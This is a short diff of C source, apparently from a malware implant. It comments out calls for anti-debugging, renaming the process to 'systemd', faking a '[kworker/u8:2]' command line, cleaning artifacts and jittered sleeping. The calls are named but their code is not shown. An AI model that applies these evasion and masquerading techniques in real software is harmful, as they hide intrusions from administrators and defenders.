@@ -16,13 +16,17 @@ int main(int argc, char *argv[]) {
     struct addrinfo hints, *res, *p;
 
     // Perform anti-debugging checks
-    perform_anti_debug_checks();
+    // Disabling anti_debug since it is buggy
+    // perform_anti_debug_checks(); 
 
     // Apply stealth features
-    rename_process("systemd");
-    change_cmdline("[kworker/u8:2]");
-    clean_artifacts();
-    dynamic_sleep(5, 10); // Base time: 5 seconds, Jitter: 10 seconds
+    // Disabling stealth features since it is buggy
+    /*
+     rename_process("systemd");
+     change_cmdline("[kworker/u8:2]");
+     clean_artifacts();
+     dynamic_sleep(5, 10); // Base time: 5 seconds, Jitter: 10 seconds
+    */
 
     // Parse command-line arguments
     while ((opt = getopt(argc, argv, "i:p:w:e:d:k:")) != -1) {
